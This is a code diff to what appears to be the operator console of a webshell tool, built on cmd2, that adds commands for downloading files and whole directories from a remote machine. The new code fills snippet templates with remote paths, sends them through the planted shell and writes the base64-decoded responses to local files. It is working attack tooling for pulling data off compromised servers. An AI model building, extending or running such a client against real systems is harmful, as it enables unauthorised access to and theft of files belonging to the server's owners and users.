@@ -7,6 +7,8 @@
 import cmd2
 import argparse
 import pathlib
+import base64
+
 from webshell_master_cmd import WebshellCmd
 from snippets.snippet_handler import get_snippet
 from communication import send_snippet
@@ -63,20 +65,43 @@ class ShellTerminal(WebshellCmd):
     def do_download(self, statement: cmd2.Statement):
         download_parser = argparse.ArgumentParser(prog="File download",
                                                   description="create download request to server")
-        download_parser.add_argument('remote', help="Path to the file on the remote machine, default: local name",
+        download_parser.add_argument('remote', help="Path to the file on the remote machine",
                                      default=None)
-        download_parser.add_argument('local', help="Path to the file on the local machine")
-        download_parser.add_argument('-d', '--directory', action="store_false", help="is the item a directory?")
+        download_parser.add_argument('local', help="Path to the file on the local machine, default: local name")
+        download_parser.add_argument('-d', '--directory', action="store_true", help="is the item a directory?")
         parsed_args = vars(download_parser.parse_args(statement.arg_list))
 
+        if not parsed_args['local']:
+            parsed_args['local'] = pathlib.Path(parsed_args['remote']).stem
+        print(parsed_args)
         if parsed_args['directory']:
-            pass
+            self.download_directory(parsed_args)
+        else:
+            self.download_file(parsed_args)
 
     def download_file(self, snippet_args: dict):
-        pass
+        snippet = get_snippet("file_download.snippet",
+                              {"CURRENT_DIRECTORY": self.cwd, "FILE_PATH": snippet_args['remote']})
+        file_data = base64.b64decode(send_snippet(snippet))
+        local_file = pathlib.Path(snippet_args['local'])
+        local_file.write_bytes(file_data)
+        print(f"the file {snippet_args['remote']} has been successfully written to {snippet_args['local']}")
 
     def download_directory(self, snippet_args: dict):
-        pass
+        error_message = f"could not download {snippet_args['remote']} - directory does not exist"
+        snippet = get_snippet("directory_download.snippet",
+                              {"CURRENT_DIRECTORY": self.cwd,
+                               "FOLDER_TO_DOWNLOAD": snippet_args['remote'],
+                               "ERROR_MESSAGE": error_message})
+        response = send_snippet(snippet)
+        if response == error_message:
+            print(response)
+        else:
+            pass
+            file_data = base64.b64decode(response)
+            local_file = pathlib.Path(snippet_args['local'])
+            local_file.write_bytes(file_data)
+            print(f"hopefully successfully wrote the directory to {snippet_args['local']}")
 
     def _onchange_show_errors(self, setting_name, old, new):
         if new:
